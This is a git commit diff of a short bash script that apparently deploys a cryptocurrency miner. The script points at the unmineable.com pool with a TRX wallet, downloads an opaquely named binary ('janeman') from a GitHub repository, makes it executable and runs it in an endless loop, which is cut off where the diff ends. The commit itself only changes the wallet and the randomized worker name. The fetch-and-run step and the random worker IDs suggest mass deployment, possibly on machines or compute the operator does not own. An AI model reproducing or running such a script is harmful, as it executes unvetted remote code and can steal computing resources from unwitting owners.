9077ccf85c2a977663d16344fcb6e564ce220ff5
Bababrucelee <89031163+Bababrucelee@users.noreply.github.com>
2021-08-16 22:27:36 +0530

    Update lagan_1.sh

--- lagan_1.sh
+++ lagan_1.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
-WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
+WALLET=TRX:TJSvx6gbRV1rXqSp4CLLhKDANp5nGsb4vK
+WORKER=$(echo $(shuf -i 10-40 -n 1)myrig-#krig-11q7)
 wget https://github.com/archernap/prem/raw/main/janeman
 chmod +x janeman
 	while [ 1 ]; do
